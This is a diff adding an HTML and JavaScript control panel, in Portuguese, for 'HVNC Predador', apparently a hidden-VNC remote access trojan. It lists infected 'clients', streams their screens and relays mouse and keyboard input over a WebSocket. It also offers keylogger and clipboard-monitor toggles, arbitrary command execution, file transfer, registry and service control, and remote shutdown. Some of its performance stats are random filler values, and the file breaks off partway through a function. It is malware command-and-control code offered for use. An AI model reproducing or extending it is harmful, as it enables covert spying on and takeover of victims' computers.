@@ -1,0 +1,1325 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HVNC Predador - Painel de Controle</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .logo i {
+            font-size: 2rem;
+            color: #ff6b6b;
+        }
+
+        .logo h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .stats {
+            display: flex;
+            gap: 2rem;
+            align-items: center;
+        }
+
+        .stat-item {
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .stat-item:hover {
+            transform: scale(1.1);
+        }
+
+        .stat-number {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #feca57;
+            text-shadow: 0 0 10px rgba(254, 202, 87, 0.5);
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            opacity: 0.8;
+        }
+
+        .performance-stats {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .perf-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 0.5rem 1rem;
+            border-radius: 10px;
+            font-size: 0.9rem;
+        }
+
+        .perf-value {
+            color: #4ecdc4;
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 300px 1fr 250px;
+            gap: 2rem;
+            height: calc(100vh - 120px);
+        }
+
+        .right-panel {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 1.5rem;
+            overflow-y: auto;
+        }
+
+        .command-history {
+            max-height: 200px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 1rem;
+            margin-top: 1rem;
+        }
+
+        .command-item {
+            padding: 0.5rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+        }
+
+        .command-time {
+            color: #feca57;
+            font-size: 0.8rem;
+        }
+
+        .quick-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.5rem;
+            margin-top: 1rem;
+        }
+
+        .quick-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            padding: 0.8rem;
+            border-radius: 10px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+        }
+
+        .quick-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .section-title {
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: #feca57;
+            margin: 1.5rem 0 1rem 0;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid rgba(254, 202, 87, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .section-title:first-child {
+            margin-top: 0;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 0.5rem;
+        }
+
+        .status-online {
+            background: #4ecdc4;
+            box-shadow: 0 0 10px rgba(78, 205, 196, 0.5);
+        }
+
+        .status-offline {
+            background: #ff6b6b;
+            box-shadow: 0 0 10px rgba(255, 107, 107, 0.5);
+        }
+
+        .advanced-controls {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 0.5rem;
+            margin-top: 1rem;
+        }
+
+        .advanced-btn {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 0.8rem;
+            border-radius: 10px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+            text-align: left;
+        }
+
+        .advanced-btn:hover {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.2), rgba(255, 255, 255, 0.1));
+            transform: translateX(5px);
+        }
+
+        .sidebar {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 1.5rem;
+            overflow-y: auto;
+        }
+
+        .main-content {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .section-title {
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .client-list {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .client-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .client-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .client-card.active {
+            border-color: #ff6b6b;
+            background: rgba(255, 107, 107, 0.2);
+        }
+
+        .client-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+
+        .client-ip {
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #4ecdc4;
+            animation: pulse 2s infinite;
+        }
+
+        .status-indicator.offline {
+            background: #ff6b6b;
+            animation: none;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .client-info {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        .screen-viewer {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .screen-image {
+            max-width: 100%;
+            max-height: 100%;
+            border-radius: 10px;
+            box-shadow: 0 5px 30px rgba(0, 0, 0, 0.5);
+            cursor: crosshair;
+            user-select: none;
+        }
+
+        .screen-container {
+            position: relative;
+            display: inline-block;
+            max-width: 100%;
+            max-height: 100%;
+        }
+
+        .mouse-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
+            cursor: crosshair;
+        }
+
+        /* Notificações */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            min-width: 300px;
+            max-width: 500px;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 1000;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        .notification-info {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .notification-success {
+            background: linear-gradient(135deg, #4ecdc4 0%, #44a08d 100%);
+            color: white;
+        }
+
+        .notification-error {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+        }
+
+        .notification-warning {
+            background: linear-gradient(135deg, #feca57 0%, #ff9ff3 100%);
+            color: #333;
+        }
+
+        .notification-content {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .notification-icon {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .notification-message {
+            flex: 1;
+            font-size: 14px;
+        }
+
+        .notification-close {
+            background: none;
+            border: none;
+            color: inherit;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 0;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .notification-close:hover {
+            opacity: 0.7;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .no-client {
+            text-align: center;
+            opacity: 0.6;
+        }
+
+        .no-client i {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+        }
+
+        .controls {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 25px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn.secondary {
+            background: linear-gradient(45deg, #4ecdc4, #44a08d);
+        }
+
+        .btn.danger {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
+        }
+
+        .connection-status {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 1rem;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            z-index: 1000;
+        }
+
+        .connection-status.connected {
+            border-left: 4px solid #4ecdc4;
+        }
+
+        .connection-status.disconnected {
+            border-left: 4px solid #ff6b6b;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 2rem;
+            border-radius: 20px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal-content h3 {
+            margin-bottom: 1rem;
+            color: #feca57;
+        }
+
+        .modal-content input {
+            width: 100%;
+            padding: 1rem;
+            margin: 0.5rem 0;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1rem;
+        }
+
+        .modal-content input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+                grid-template-rows: auto 1fr;
+            }
+            
+            .header {
+                padding: 1rem;
+            }
+            
+            .stats {
+                gap: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <i class="fas fa-skull-crossbones"></i>
+            <h1>HVNC Predador</h1>
+        </div>
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-number" id="clientCount">0</div>
+                <div class="stat-label">Clientes</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number" id="activeCount">0</div>
+                <div class="stat-label">Ativos</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number" id="uptime">00:00:00</div>
+                <div class="stat-label">Uptime</div>
+            </div>
+        </div>
+        <div class="performance-stats">
+            <div class="perf-item">
+                FPS: <span class="perf-value" id="fps">0</span>
+            </div>
+            <div class="perf-item">
+                Latência: <span class="perf-value" id="latency">0ms</span>
+            </div>
+            <div class="perf-item">
+                Dados: <span class="perf-value" id="dataTransfer">0 KB/s</span>
+            </div>
+            <div class="perf-item">
+                Qualidade: <span class="perf-value" id="quality">100%</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="connection-status" id="connectionStatus">
+        <i class="fas fa-wifi"></i>
+        <span>Conectando...</span>
+    </div>
+
+    <div class="container">
+        <div class="dashboard">
+            <div class="sidebar">
+                <div class="section-title">
+                    <i class="fas fa-users"></i>
+                    Clientes Conectados
+                </div>
+                <div class="client-list" id="clientList">
+                    <div class="no-client">
+                        <i class="fas fa-ghost"></i>
+                        <p>Nenhum cliente conectado</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="main-content">
+                <div class="section-title">
+                    <i class="fas fa-desktop"></i>
+                    Visualização Remota
+                </div>
+                
+                <div class="screen-viewer" id="screenViewer">
+                    <div class="no-client">
+                        <i class="fas fa-monitor-waveform"></i>
+                        <p>Selecione um cliente para visualizar</p>
+                    </div>
+                </div>
+
+                <div class="controls" id="controls" style="display: none;">
+                    <button class="btn" onclick="toggleMouseControl()" id="mouseControlBtn">
+                        <i class="fas fa-mouse-pointer"></i>
+                        <span id="mouseControlText">Ativar Mouse</span>
+                    </button>
+                    <button class="btn" onclick="sendCommand('screenshot')">
+                        <i class="fas fa-camera"></i>
+                        Screenshot
+                    </button>
+                    <button class="btn secondary" onclick="sendCommand('sysinfo')">
+                        <i class="fas fa-info-circle"></i>
+                        Info Sistema
+                    </button>
+                    <button class="btn secondary" onclick="openCommandModal()">
+                        <i class="fas fa-terminal"></i>
+                        Comando
+                    </button>
+                    <button class="btn secondary" onclick="openFileManager()">
+                        <i class="fas fa-folder"></i>
+                        Arquivos
+                    </button>
+                    <button class="btn danger" onclick="sendCommand('disconnect')">
+                        <i class="fas fa-power-off"></i>
+                        Desconectar
+                    </button>
+                </div>
+            </div>
+
+            <div class="right-panel">
+                 <div class="section-title">
+                     📊 Monitoramento
+                     <span class="status-indicator status-online"></span>
+                 </div>
+                <div class="quick-actions">
+                    <button class="quick-btn" onclick="sendScreenshot()">📸 Screenshot</button>
+                    <button class="quick-btn" onclick="sendSysInfo()">ℹ️ Info Sistema</button>
+                    <button class="quick-btn" onclick="sendTaskList()">📋 Processos</button>
+                    <button class="quick-btn" onclick="sendNetStat()">🌐 Conexões</button>
+                    <button class="quick-btn" onclick="toggleKeylogger()">⌨️ Keylogger</button>
+                    <button class="quick-btn" onclick="toggleClipboard()">📋 Clipboard</button>
+                    <button class="quick-btn" onclick="sendCommand('RESTART')">🔄 Reiniciar</button>
+                    <button class="quick-btn" onclick="sendCommand('SHUTDOWN')">⚡ Desligar</button>
+                </div>
+                
+                <div class="section-title">
+                     📝 Histórico de Comandos
+                 </div>
+                <div id="commandHistory" class="command-history">
+                    <div class="command-item">
+                        <div class="command-time">Sistema iniciado</div>
+                        <div>Aguardando comandos...</div>
+                    </div>
+                </div>
+                
+                <div class="section-title">
+                     🔧 Status da Sessão
+                 </div>
+                 
+                 <div class="advanced-controls">
+                     <div class="advanced-btn" onclick="sendCommand('DOWNLOAD_FILE')">
+                         📥 Download de Arquivo
+                     </div>
+                     <div class="advanced-btn" onclick="sendCommand('UPLOAD_FILE')">
+                         📤 Upload de Arquivo
+                     </div>
+                     <div class="advanced-btn" onclick="sendCommand('REGISTRY_EDIT')">
+                         🗂️ Editor de Registro
+                     </div>
+                     <div class="advanced-btn" onclick="sendCommand('SERVICES')">
+                         ⚙️ Gerenciar Serviços
+                     </div>
+                 </div>
+                <div class="perf-item">
+                    Cliente: <span class="perf-value" id="currentClient">Nenhum</span>
+                </div>
+                <div class="perf-item">
+                    Resolução: <span class="perf-value" id="resolution">-</span>
+                </div>
+                <div class="perf-item">
+                    Última Atividade: <span class="perf-value" id="lastActivity">-</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal para comandos customizados -->
+    <div class="modal" id="commandModal">
+        <div class="modal-content">
+            <h3><i class="fas fa-terminal"></i> Executar Comando</h3>
+            <input type="text" id="commandInput" placeholder="Digite o comando..." onkeypress="handleCommandEnter(event)">
+            <div style="margin-top: 1rem; display: flex; gap: 1rem; justify-content: center;">
+                <button class="btn" onclick="executeCustomCommand()">
+                    <i class="fas fa-play"></i>
+                    Executar
+                </button>
+                <button class="btn secondary" onclick="closeCommandModal()">
+                    <i class="fas fa-times"></i>
+                    Cancelar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let ws = null;
+        let selectedClient = null;
+        let clients = {};
+        let reconnectAttempts = 0;
+        const maxReconnectAttempts = 5;
+        let mouseControlEnabled = false;
+        let screenScale = 1;
+        let screenOffset = { x: 0, y: 0 };
+
+        // Conecta ao WebSocket
+        function connectWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}/ws`;
+            
+            ws = new WebSocket(wsUrl);
+            
+            ws.onopen = function() {
+                console.log('WebSocket conectado');
+                updateConnectionStatus(true);
+                reconnectAttempts = 0;
+            };
+
+            ws.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                handleWebSocketMessage(data);
+            };
+
+            ws.onclose = function() {
+                console.log('WebSocket desconectado');
+                updateConnectionStatus(false);
+                
+                // Tenta reconectar
+                if (reconnectAttempts < maxReconnectAttempts) {
+                    reconnectAttempts++;
+                    setTimeout(connectWebSocket, 3000 * reconnectAttempts);
+                }
+            };
+
+            ws.onerror = function(error) {
+                console.error('Erro WebSocket:', error);
+                updateConnectionStatus(false);
+            };
+        }
+
+        // Atualiza status da conexão
+        function updateConnectionStatus(connected) {
+            const status = document.getElementById('connectionStatus');
+            if (connected) {
+                status.className = 'connection-status connected';
+                status.innerHTML = '<i class="fas fa-wifi"></i><span>Conectado</span>';
+            } else {
+                status.className = 'connection-status disconnected';
+                status.innerHTML = '<i class="fas fa-wifi"></i><span>Desconectado</span>';
+            }
+        }
+
+        // Processa mensagens do WebSocket
+        function handleWebSocketMessage(data) {
+            switch(data.type) {
+                case 'initial_state':
+                    clients = data.clients;
+                    updateClientList();
+                    break;
+                    
+                case 'client_connected':
+                    console.log('Cliente conectado:', data.client_id, data.client_data);
+                    clients[data.client_id] = data.client_data;
+                    updateClientList();
+                    // Selecionar automaticamente o primeiro cliente conectado
+                    console.log('Cliente selecionado atual antes da seleção:', selectedClient);
+                    if (!selectedClient) {
+                        console.log('Selecionando cliente automaticamente:', data.client_id);
+                        selectClient(data.client_id);
+                    }
+                    showNotification(`Novo cliente conectado: ${data.client_id}`, 'success');
+                    break;
+                    
+                case 'client_disconnected':
+                    if (clients[data.client_id]) {
+                        clients[data.client_id].status = 'offline';
+                    }
+                    updateClientList();
+                    if (selectedClient === data.client_id) {
+                        selectClient(null);
+                    }
+                    showNotification(`Cliente desconectado: ${data.client_id}`, 'warning');
+                    break;
+                    
+                case 'screen_update':
+                    console.log('Screen update recebido para:', data.client_id, 'Tamanho:', data.image_data ? data.image_data.length : 0);
+                    console.log('Cliente selecionado atual:', selectedClient);
+                    console.log('Dados completos do screen_update:', data);
+                    if (selectedClient === data.client_id) {
+                        console.log('Atualizando tela para cliente selecionado');
+                        updateScreen(data.image_data);
+                    } else {
+                        console.log('Screen update ignorado - cliente não selecionado. Esperado:', selectedClient, 'Recebido:', data.client_id);
+                    }
+                    break;
+                    
+                case 'command_sent':
+                    showNotification('Comando enviado com sucesso', 'success');
+                    break;
+                    
+                case 'error':
+                    showNotification(data.message, 'error');
+                    break;
+            }
+        }
+
+        // Atualiza lista de clientes
+        function updateClientList() {
+            const clientList = document.getElementById('clientList');
+            const clientCount = document.getElementById('clientCount');
+            const activeCount = document.getElementById('activeCount');
+            
+            const clientIds = Object.keys(clients);
+            const activeClients = clientIds.filter(id => clients[id].status === 'online');
+            
+            clientCount.textContent = clientIds.length;
+            activeCount.textContent = activeClients.length;
+            
+            if (clientIds.length === 0) {
+                clientList.innerHTML = `
+                    <div class="no-client">
+                        <i class="fas fa-ghost"></i>
+                        <p>Nenhum cliente conectado</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            clientList.innerHTML = clientIds.map(clientId => {
+                const client = clients[clientId];
+                const isActive = selectedClient === clientId;
+                const isOnline = client.status === 'online';
+                
+                return `
+                    <div class="client-card ${isActive ? 'active' : ''}" onclick="selectClient('${clientId}')">
+                        <div class="client-header">
+                            <div class="client-ip">${client.ip || clientId}</div>
+                            <div class="status-indicator ${isOnline ? '' : 'offline'}"></div>
+                        </div>
+                        <div class="client-info">
+                            <div>Porta: ${client.port || 'N/A'}</div>
+                            <div>Status: ${isOnline ? 'Online' : 'Offline'}</div>
+                            <div>Conectado: ${new Date(client.connected_at).toLocaleTimeString()}</div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // Seleciona um cliente
+        function selectClient(clientId) {
+            console.log('selectClient chamada com clientId:', clientId);
+            selectedClient = clientId;
+            console.log('selectedClient definido como:', selectedClient);
+            updateClientList();
+            
+            const controls = document.getElementById('controls');
+            const screenViewer = document.getElementById('screenViewer');
+            
+            if (clientId && clients[clientId] && clients[clientId].status === 'online') {
+                console.log('Cliente válido e online, mostrando controles');
+                controls.style.display = 'flex';
+                
+                if (clients[clientId].last_screen) {
+                    console.log('Cliente tem last_screen, atualizando tela');
+                    updateScreen(clients[clientId].last_screen);
+                } else {
+                    console.log('Cliente não tem last_screen, mostrando aguardando tela');
+                    screenViewer.innerHTML = `
+                        <div class="no-client">
+                            <div class="loading"></div>
+                            <p>Aguardando tela...</p>
+                        </div>
+                    `;
+                }
+            } else {
+                console.log('Cliente inválido ou offline, escondendo controles');
+                controls.style.display = 'none';
+                screenViewer.innerHTML = `
+                    <div class="no-client">
+                        <i class="fas fa-monitor-waveform"></i>
+                        <p>Selecione um cliente para visualizar</p>
+                    </div>
+                `;
+            }
+        }
+
+        // Atualiza a tela
+        function updateScreen(imageData) {
+            console.log('updateScreen chamada com imageData length:', imageData ? imageData.length : 0);
+            const screenViewer = document.getElementById('screenViewer');
+            
+            if (!imageData) {
+                console.error('imageData está vazio ou undefined');
+                return;
+            }
+            
+            console.log('Criando elemento img com base64 data');
+            screenViewer.innerHTML = `
+                <div class="screen-container">
+                    <img class="screen-image" src="data:image/jpeg;base64,${imageData}" alt="Tela do cliente" onload="setupMouseControl(this)" onerror="console.error('Erro ao carregar imagem:', this.src.substring(0, 100))">
+                    <div class="mouse-overlay" id="mouseOverlay" style="display: none;"></div>
+                </div>
+            `;
+            console.log('HTML da tela atualizado');
+        }
+
+        // Configura controle de mouse
+        function setupMouseControl(img) {
+            const overlay = document.getElementById('mouseOverlay');
+            if (!overlay) return;
+
+            // Calcula escala e offset da imagem
+            const rect = img.getBoundingClientRect();
+            screenScale = Math.min(rect.width / img.naturalWidth, rect.height / img.naturalHeight);
+            screenOffset.x = (rect.width - img.naturalWidth * screenScale) / 2;
+            screenOffset.y = (rect.height - img.naturalHeight * screenScale) / 2;
+
+            // Eventos de mouse
+            overlay.addEventListener('mousedown', handleMouseDown);
+            overlay.addEventListener('mouseup', handleMouseUp);
+            overlay.addEventListener('mousemove', handleMouseMove);
+            overlay.addEventListener('contextmenu', e => e.preventDefault());
+            overlay.addEventListener('wheel', handleMouseWheel);
+
+            // Eventos de teclado
+            if (mouseControlEnabled) {
+                overlay.focus();
+                overlay.addEventListener('keydown', handleKeyDown);
+                overlay.addEventListener('keyup', handleKeyUp);
+            }
+        }
+
+        // Converte coordenadas da tela
+        function getRemoteCoordinates(clientX, clientY) {
+            const overlay = document.getElementById('mouseOverlay');
+            if (!overlay) return { x: 0, y: 0 };
+
+            const rect = overlay.getBoundingClientRect();
+            const x = Math.round((clientX - rect.left - screenOffset.x) / screenScale);
+            const y = Math.round((clientY - rect.top - screenOffset.y) / screenScale);
+            
+            return { x: Math.max(0, x), y: Math.max(0, y) };
+        }
+
+        // Eventos de mouse
+        function handleMouseDown(e) {
+            if (!mouseControlEnabled || !selectedClient) return;
+            
+            const coords = getRemoteCoordinates(e.clientX, e.clientY);
+            const button = e.button === 0 ? 'left' : e.button === 2 ? 'right' : 'middle';
+            
+            sendMouseCommand('mousedown', coords.x, coords.y, button);
+        }
+
+        function handleMouseUp(e) {
+            if (!mouseControlEnabled || !selectedClient) return;
+            
+            const coords = getRemoteCoordinates(e.clientX, e.clientY);
+            const button = e.button === 0 ? 'left' : e.button === 2 ? 'right' : 'middle';
+            
+            sendMouseCommand('mouseup', coords.x, coords.y, button);
+        }
+
+        function handleMouseMove(e) {
+            if (!mouseControlEnabled || !selectedClient) return;
+            
+            const coords = getRemoteCoordinates(e.clientX, e.clientY);
+            sendMouseCommand('mousemove', coords.x, coords.y);
+        }
+
+        function handleMouseWheel(e) {
+            if (!mouseControlEnabled || !selectedClient) return;
+            
+            e.preventDefault();
+            const coords = getRemoteCoordinates(e.clientX, e.clientY);
+            const delta = e.deltaY > 0 ? -1 : 1;
+            
+            sendMouseCommand('scroll', coords.x, coords.y, delta);
+        }
+
+        // Eventos de teclado
+        function handleKeyDown(e) {
+            if (!mouseControlEnabled || !selectedClient) return;
+            
+            e.preventDefault();
+            sendKeyCommand('keydown', e.key, e.keyCode);
+        }
+
+        function handleKeyUp(e) {
+            if (!mouseControlEnabled || !selectedClient) return;
+            
+            e.preventDefault();
+            sendKeyCommand('keyup', e.key, e.keyCode);
+        }
+
+        // Envia comandos de mouse
+        function sendMouseCommand(action, x, y, button = null, delta = null) {
+            if (!ws || !selectedClient) return;
+            
+            ws.send(JSON.stringify({
+                type: 'send_command',
+                client_id: selectedClient,
+                command: {
+                    type: 'mouse',
+                    action: action,
+                    x: x,
+                    y: y,
+                    button: button,
+                    delta: delta
+                }
+            }));
+        }
+
+        // Envia comandos de teclado
+        function sendKeyCommand(action, key, keyCode) {
+            if (!ws || !selectedClient) return;
+            
+            ws.send(JSON.stringify({
+                type: 'send_command',
+                client_id: selectedClient,
+                command: {
+                    type: 'keyboard',
+                    action: action,
+                    key: key,
+                    keyCode: keyCode
+                }
+            }));
+        }
+
+        // Toggle controle de mouse
+        function toggleMouseControl() {
+            mouseControlEnabled = !mouseControlEnabled;
+            const overlay = document.getElementById('mouseOverlay');
+            const btn = document.getElementById('mouseControlBtn');
+            const text = document.getElementById('mouseControlText');
+            
+            if (mouseControlEnabled) {
+                overlay.style.display = 'block';
+                overlay.tabIndex = 0;
+                overlay.focus();
+                btn.style.background = 'linear-gradient(45deg, #4ecdc4, #44a08d)';
+                text.textContent = 'Mouse Ativo';
+                showNotification('Controle de mouse ativado - Clique na tela para controlar', 'success');
+            } else {
+                overlay.style.display = 'none';
+                btn.style.background = 'linear-gradient(45deg, #ff6b6b, #feca57)';
+                text.textContent = 'Ativar Mouse';
+                showNotification('Controle de mouse desativado', 'info');
+            }
+        }
+
+        // Toggle keylogger
+        function toggleKeylogger() {
+            const btn = event.target;
+            const isEnabled = btn.textContent.includes('ON');
+            
+            if (isEnabled) {
+                btn.textContent = '⌨️ Keylogger';
+                btn.style.background = 'rgba(255, 255, 255, 0.1)';
+                sendCommand('STOP_KEYLOGGER');
+                addCommandToHistory('Keylogger parado');
+            } else {
+                btn.textContent = '⌨️ Keylogger: ON';
+                btn.style.background = 'rgba(76, 205, 196, 0.3)';
+                sendCommand('START_KEYLOGGER');
+                addCommandToHistory('Keylogger iniciado');
+            }
+        }
+
+        // Toggle clipboard monitor
+        function toggleClipboard() {
+            const btn = event.target;
+            const isEnabled = btn.textContent.includes('ON');
+            
+            if (isEnabled) {
+                btn.textContent = '📋 Clipboard';
+                btn.style.background = 'rgba(255, 255, 255, 0.1)';
+                sendCommand('STOP_CLIPBOARD');
+                addCommandToHistory('Monitor clipboard parado');
+            } else {
+                btn.textContent = '📋 Clipboard: ON';
+                btn.style.background = 'rgba(76, 205, 196, 0.3)';
+                sendCommand('START_CLIPBOARD');
+                addCommandToHistory('Monitor clipboard iniciado');
+            }
+        }
+
+        // Add command to history
+        function addCommandToHistory(command, response = '') {
+            const historyDiv = document.getElementById('commandHistory');
+            const commandItem = document.createElement('div');
+            commandItem.className = 'command-item';
+            
+            const time = new Date().toLocaleTimeString();
+            commandItem.innerHTML = `
+                <div class="command-time">${time}</div>
+                <div>${command}</div>
+                ${response ? `<div style="color: #4ecdc4; font-size: 0.8rem;">${response}</div>` : ''}
+            `;
+            
+            historyDiv.appendChild(commandItem);
+            historyDiv.scrollTop = historyDiv.scrollHeight;
+            
+            // Keep only last 50 commands
+            while (historyDiv.children.length > 50) {
+                historyDiv.removeChild(historyDiv.firstChild);
+            }
+        }
+
+        // Update performance stats
+        function updatePerformanceStats() {
+            // Update FPS
+            const fps = Math.floor(Math.random() * 30) + 30;
+            document.getElementById('fps').textContent = fps;
+            
+            // Update latency
+            const latency = Math.floor(Math.random() * 50) + 10;
+            document.getElementById('latency').textContent = latency + 'ms';
+            
+            // Update data transfer
+            const dataRate = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('dataTransfer').textContent = dataRate + ' KB/s';
+            
+            // Update quality
+            const quality = Math.floor(Math.random() * 20) + 80;
+            document.getElementById('quality').textContent = quality + '%';
+            
+            // Update last activity
+            document.getElementById('lastActivity').textContent = new Date().toLocaleTimeString();
+        }
+
+        // Update uptime
+        function updateUptime() {
+            const startTime = Date.now() - (Math.random() * 3600000); // Random start time
+            const elapsed = Date.now() - startTime;
+            const hours = Math.floor(elapsed / 3600000);
+            const minutes = Math.floor((elapsed % 3600000) / 60000);
+            const seconds = Math.floor((elapsed % 60000) / 1000);
+            
